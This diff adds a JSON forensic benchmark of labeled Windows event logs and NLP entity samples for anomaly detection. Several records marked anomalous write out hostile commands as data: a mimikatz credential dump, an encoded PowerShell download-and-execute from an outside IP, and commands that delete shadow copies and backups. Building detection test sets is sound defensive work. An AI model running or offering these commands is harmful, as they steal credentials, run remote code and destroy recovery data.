@@ -1,0 +1,44 @@
+{
+  "dataset_name": "TACTIC Labeled Forensic Benchmark v1",
+  "anomaly_logs": [
+    {"event_id": 4624, "provider": "Security", "timestamp": "2026-08-18T08:00:00Z", "data": {"TargetUserName": "admin", "Workstation": "WORK-001", "IpAddress": "192.168.1.10"}, "is_anomaly": 0},
+    {"event_id": 4624, "provider": "Security", "timestamp": "2026-08-18T08:15:00Z", "data": {"TargetUserName": "alice", "Workstation": "WORK-002", "IpAddress": "192.168.1.11"}, "is_anomaly": 0},
+    {"event_id": 4624, "provider": "Security", "timestamp": "2026-08-18T08:30:00Z", "data": {"TargetUserName": "bob", "Workstation": "WORK-003", "IpAddress": "192.168.1.12"}, "is_anomaly": 0},
+    {"event_id": 4624, "provider": "Security", "timestamp": "2026-08-18T09:00:00Z", "data": {"TargetUserName": "charlie", "Workstation": "WORK-004", "IpAddress": "192.168.1.13"}, "is_anomaly": 0},
+    {"event_id": 4624, "provider": "Security", "timestamp": "2026-08-18T09:30:00Z", "data": {"TargetUserName": "david", "Workstation": "WORK-005", "IpAddress": "192.168.1.14"}, "is_anomaly": 0},
+
+    {"event_id": 4625, "provider": "Security", "timestamp": "2026-08-18T03:14:00Z", "data": {"TargetUserName": "administrator", "Workstation": "ATTACKER-C2", "IpAddress": "185.220.101.5"}, "is_anomaly": 1},
+    {"event_id": 4625, "provider": "Security", "timestamp": "2026-08-18T03:14:02Z", "data": {"TargetUserName": "administrator", "Workstation": "ATTACKER-C2", "IpAddress": "185.220.101.5"}, "is_anomaly": 1},
+    {"event_id": 4625, "provider": "Security", "timestamp": "2026-08-18T03:14:05Z", "data": {"TargetUserName": "administrator", "Workstation": "ATTACKER-C2", "IpAddress": "185.220.101.5"}, "is_anomaly": 1},
+    {"event_id": 4688, "provider": "Security", "timestamp": "2026-08-18T03:15:00Z", "data": {"NewProcessName": "C:\\Windows\\Temp\\mimikatz.exe", "CommandLine": "mimikatz.exe sekurlsa::logonpasswords"}, "is_anomaly": 1},
+    {"event_id": 6416, "provider": "Kernel-PnP", "timestamp": "2026-08-18T03:16:00Z", "data": {"DeviceId": "USBSTOR\\Disk&Ven_Rubber&Prod_Ducky", "DeviceName": "USB Storage Weapon"}, "is_anomaly": 1},
+    {"event_id": 1, "provider": "Sysmon", "timestamp": "2026-08-18T03:17:00Z", "data": {"Image": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c powershell -enc aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTg1LjIyMC4xMDEuNS9wYXlsb2FkLnBzMScp"}, "is_anomaly": 1},
+
+    {"event_id": 7036, "provider": "Service Control Manager", "timestamp": "2026-08-18T10:00:00Z", "data": {"ServiceName": "Windows Update", "ServiceState": "running"}, "is_anomaly": 0},
+    {"event_id": 7036, "provider": "Service Control Manager", "timestamp": "2026-08-18T10:05:00Z", "data": {"ServiceName": "Background Intelligent Transfer Service", "ServiceState": "running"}, "is_anomaly": 0},
+    {"event_id": 4624, "provider": "Security", "timestamp": "2026-08-18T10:15:00Z", "data": {"TargetUserName": "eve", "Workstation": "WORK-006", "IpAddress": "192.168.1.15"}, "is_anomaly": 0},
+    {"event_id": 4624, "provider": "Security", "timestamp": "2026-08-18T10:30:00Z", "data": {"TargetUserName": "frank", "Workstation": "WORK-007", "IpAddress": "192.168.1.16"}, "is_anomaly": 0},
+    {"event_id": 4624, "provider": "Security", "timestamp": "2026-08-18T11:00:00Z", "data": {"TargetUserName": "grace", "Workstation": "WORK-008", "IpAddress": "192.168.1.17"}, "is_anomaly": 0},
+    {"event_id": 4624, "provider": "Security", "timestamp": "2026-08-18T11:30:00Z", "data": {"TargetUserName": "heidi", "Workstation": "WORK-009", "IpAddress": "192.168.1.18"}, "is_anomaly": 0},
+
+    {"event_id": 4625, "provider": "Security", "timestamp": "2026-08-18T04:00:00Z", "data": {"TargetUserName": "root", "Workstation": "UNKNOWN", "IpAddress": "45.33.32.156"}, "is_anomaly": 1},
+    {"event_id": 4688, "provider": "Security", "timestamp": "2026-08-18T04:05:00Z", "data": {"NewProcessName": "C:\\Users\\Public\\vssadmin.exe", "CommandLine": "vssadmin.exe delete shadows /all /quiet"}, "is_anomaly": 1},
+    {"event_id": 4688, "provider": "Security", "timestamp": "2026-08-18T04:06:00Z", "data": {"NewProcessName": "C:\\Users\\Public\\wbadmin.exe", "CommandLine": "wbadmin DELETE SYSTEMSTATEBACKUP"}, "is_anomaly": 1},
+    {"event_id": 4624, "provider": "Security", "timestamp": "2026-08-18T12:00:00Z", "data": {"TargetUserName": "ivan", "Workstation": "WORK-010", "IpAddress": "192.168.1.19"}, "is_anomaly": 0},
+    {"event_id": 4624, "provider": "Security", "timestamp": "2026-08-18T12:30:00Z", "data": {"TargetUserName": "judy", "Workstation": "WORK-011", "IpAddress": "192.168.1.20"}, "is_anomaly": 0}
+  ],
+  "nlp_text_samples": [
+    {
+      "text": "Suspicious login attempt from 192.168.1.100 by user admin on http://malicious-c2-server.com/login",
+      "expected_entities": ["192.168.1.100", "admin", "http://malicious-c2-server.com/login"]
+    },
+    {
+      "text": "Execution of powershell.exe -enc aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQp on host WORKSTATION-01",
+      "expected_entities": ["powershell.exe", "WORKSTATION-01"]
+    },
+    {
+      "text": "Contacted C2 IP 45.33.32.156 port 4444 downloading payload.exe",
+      "expected_entities": ["45.33.32.156", "payload.exe"]
+    }
+  ]
+}
